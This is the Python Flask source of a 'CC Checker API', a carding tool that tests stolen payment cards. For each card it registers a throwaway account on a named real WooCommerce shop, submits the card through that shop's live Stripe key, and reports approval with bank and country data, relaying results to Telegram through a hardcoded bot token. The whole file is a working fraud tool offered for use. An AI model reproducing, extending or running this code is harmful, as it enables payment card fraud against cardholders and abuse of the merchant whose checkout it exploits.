from flask import Flask, request, jsonify
import requests
import re
import threading
import random
import string

# --- Configuration ---
BOT_TOKEN = '8323578379:AAFDGDFlHEEakTK3Mw49ANizwsbewPAaWKo'
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"  # Fixed: Use sendMessage for new messages
TELEGRAM_EDIT_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"

app = Flask(__name__)

# --- Logic for Stripe Auth ---
def stripe_auth_check(cc, mm, yy, cvv):
    session = requests.Session()
    session.headers.update({'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'})
    
    if len(yy) == 4: 
        yy = yy[-2:]
    
    try:
        # Get login page
        login_page_res = session.get('https://shop.wiseacrebrew.com/account/', timeout=30)
        login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
        
        if not login_nonce_match: 
            return {"status": "Declined", "response": "Failed to get login nonce.", "decline_type": "process_error"}
        
        login_nonce = login_nonce_match.group(1)
        random_email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'
        
        # Register
        register_data = {
            'email': random_email, 
            'password': 'Password123!', 
            'woocommerce-register-nonce': login_nonce, 
            '_wp_http_referer': '/account/', 
            'register': 'Register'
        }
        session.post('https://shop.wiseacrebrew.com/account/', data=register_data, timeout=30)
        
        # Get payment page
        payment_page_res = session.get('https://shop.wiseacrebrew.com/account/add-payment-method/', timeout=30)
        payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
        
        if not payment_nonce_match: 
            return {"status": "Declined", "response": "Failed to get payment nonce.", "decline_type": "process_error"}
        
        ajax_nonce = payment_nonce_match.group(1)
        
        # Create payment method with Stripe
        stripe_data = (f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}'
                       '&key=pk_live_51TWskSF79lbCDrn2YUT5OTMiCtJOtfjPRdu5Fvi77BXKcyrqYdDV43q7k7XTJlO8docnOY45e6KdcPZdYzPoyFRr00Xlnsy2Wn')
        
        stripe_response = session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data, timeout=30)
        
        if stripe_response.status_code == 402:
            error_msg = stripe_response.json().get('error', {}).get('message', 'Declined by Stripe.')
            return {"status": "Declined", "response": error_msg, "decline_type": "card_decline"}
        
        payment_token = stripe_response.json().get('id')
        if not payment_token: 
            return {"status": "Declined", "response": "Failed to retrieve Stripe token.", "decline_type": "process_error"}
        
        # Confirm setup intent
        site_data = {
            'action': 'create_and_confirm_setup_intent', 
            'wc-stripe-payment-method': payment_token, 
            'wc-stripe-payment-type': 'card', 
            '_ajax_nonce': ajax_nonce
        }
        
        final_response = session.post('https://shop.wiseacrebrew.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', 
                                      data=site_data, timeout=30)
        response_json = final_response.json()
        
        if response_json.get('success') is False or response_json.get('status') == 'error':
            error_message = (response_json.get('data', {}).get('error', {}).get('message') or 
                           re.sub('<[^<]+?>', '', response_json.get('messages', 'Declined by website.')))
            return {"status": "Declined", "response": error_message.strip(), "decline_type": "card_decline"}
        
        if response_json.get('status') == 'succeeded': 
            return {"status": "Approved", "response": "Payment method successfully added.", "decline_type": "none"}
        else: 
            return {"status": "Declined", "response": "Unknown response from website.", "decline_type": "process_error"}
            
    except requests.exceptions.Timeout:
        return {"status": "Declined", "response": "Request timeout", "decline_type": "process_error"}
    except Exception as e:
        return {"status": "Declined", "response": f"An unexpected error occurred: {str(e)}", "decline_type": "process_error"}

# --- Logic for Braintree Auth ---
def braintree_check(cc, mm, yy, cvv):
    # Placeholder - Add your Braintree logic here
    return {"status": "Declined", "response": "Braintree not configured yet", "decline_type": "process_error"}

# --- Logic for Stripe Charge ---
def stripe_charge_check(cc, mm, yy, cvv):
    # Placeholder - Add your Stripe Charge logic here
    return {"status": "Declined", "response": "Stripe Charge not configured yet", "decline_type": "process_error"}

# --- BIN Info Function ---
def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=10)
        if response.status_code == 200:
            return response.json()
        return {}
    except Exception: 
        return {}

# --- Background Task Function ---
def background_task(chat_id, message_id, full_cc_string, gateway_function, gateway_name):
    try:
        parts = full_cc_string.split('|')
        if len(parts) != 4:
            error_message = f"""<b>Error ❌ ({gateway_name})</b>\n\n<b>Invalid card format!</b>\nExpected: CC|MM|YY|CVV\nReceived: {full_cc_string}"""
            payload = {'chat_id': chat_id, 'message_id': message_id, 'text': error_message, 'parse_mode': 'HTML'}
            requests.post(TELEGRAM_EDIT_URL, json=payload, timeout=30)
            return
            
        cc, mm, yy, cvv = parts
        check_result = gateway_function(cc, mm, yy, cvv)
        bin_info = get_bin_info(cc[:6])
        
        status = check_result.get('status', 'Declined')
        response_message = check_result.get('response', 'No response.')
        
        # Get BIN info with defaults
        brand = bin_info.get('brand', 'Unknown') if bin_info else 'Unknown'
        card_type = bin_info.get('type', 'Unknown') if bin_info else 'Unknown'
        country = bin_info.get('country_name', 'Unknown') if bin_info else 'Unknown'
        country_flag = bin_info.get('country_flag', '') if bin_info else ''
        bank = bin_info.get('bank', 'Unknown') if bin_info else 'Unknown'
        
        if status == "Approved":
            final_message = f"""<b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ ({gateway_name})</b>\n\n<b>𝗖𝗮𝗿𝗱:</b> <code>{full_cc_string}</code>\n<b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {response_message}\n\n<b>𝗜𝗻𝗳𝗼:</b> {brand} - {card_type}\n<b>𝐈𝐬𝐬𝐮𝐞𝐫:</b> {bank}\n<b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> {country} {country_flag}"""
        else:
            final_message = f"""<b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ ({gateway_name})</b>\n\n<b>𝗖𝗮𝗿𝗱:</b> <code>{full_cc_string}</code>\n<b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {response_message}\n\n<b>𝗜𝗻𝗳𝗼:</b> {brand} - {card_type}\n<b>𝐈𝐬𝐬𝐮𝐞𝐫:</b> {bank}\n<b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> {country} {country_flag}"""
        
        payload = {'chat_id': chat_id, 'message_id': message_id, 'text': final_message, 'parse_mode': 'HTML'}
        requests.post(TELEGRAM_EDIT_URL, json=payload, timeout=30)
        
    except Exception as e:
        error_message = f"""<b>Error ❌ ({gateway_name})</b>\n\n<b>Background task failed:</b> {str(e)}"""
        payload = {'chat_id': chat_id, 'message_id': message_id, 'text': error_message, 'parse_mode': 'HTML'}
        requests.post(TELEGRAM_EDIT_URL, json=payload, timeout=30)

# --- API Endpoints ---

# Endpoint for Stripe Auth (Fast)
@app.route('/stripe_auth', methods=['GET'])
def stripe_auth_endpoint():
    try:
        card_str = request.args.get('card')
        if not card_str:
            return jsonify({"error": "Missing 'card' parameter. Format: CC|MM|YY|CVV"}), 400
        
        parts = card_str.split('|')
        if len(parts) != 4:
            return jsonify({"error": "Invalid card format. Expected: CC|MM|YY|CVV"}), 400
        
        cc, mm, yy, cvv = parts
        check_result = stripe_auth_check(cc, mm, yy, cvv)
        bin_info = get_bin_info(cc[:6])
        
        final_result = {
            "status": check_result["status"], 
            "response": check_result["response"],
            "decline_type": check_result.get("decline_type", "unknown"),
            "bin_info": bin_info
        }
        return jsonify(final_result)
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Endpoint for Braintree (Slow, Asynchronous)
@app.route('/braintree', methods=['POST'])
def braintree_endpoint():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Missing JSON body"}), 400
        
        required_fields = ['chat_id', 'message_id', 'card']
        for field in required_fields:
            if field not in data:
                return jsonify({"error": f"Missing required field: {field}"}), 400
        
        thread = threading.Thread(target=background_task, args=(
            data['chat_id'], 
            data['message_id'], 
            data['card'], 
            braintree_check, 
            "Braintree"
        ))
        thread.daemon = True
        thread.start()
        
        return jsonify({"status": "Process started.", "message": "Result will be sent to Telegram"})
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Endpoint for Stripe Charge (Slow, Asynchronous)
@app.route('/stripe_charge', methods=['POST'])
def stripe_charge_endpoint():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "Missing JSON body"}), 400
        
        required_fields = ['chat_id', 'message_id', 'card']
        for field in required_fields:
            if field not in data:
                return jsonify({"error": f"Missing required field: {field}"}), 400
        
        thread = threading.Thread(target=background_task, args=(
            data['chat_id'], 
            data['message_id'], 
            data['card'], 
            stripe_charge_check, 
            "Stripe Charge"
        ))
        thread.daemon = True
        thread.start()
        
        return jsonify({"status": "Process started.", "message": "Result will be sent to Telegram"})
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Health check endpoint for Render
@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({"status": "healthy", "service": "CC Checker API"}), 200

# Root endpoint
@app.route('/', methods=['GET'])
def root():
    return jsonify({
        "service": "CC Checker API",
        "endpoints": {
            "/stripe_auth": "GET - Check card with Stripe Auth (fast)",
            "/braintree": "POST - Check card with Braintree (async)",
            "/stripe_charge": "POST - Check card with Stripe Charge (async)",
            "/health": "GET - Health check"
        }
    }), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000, debug=False)
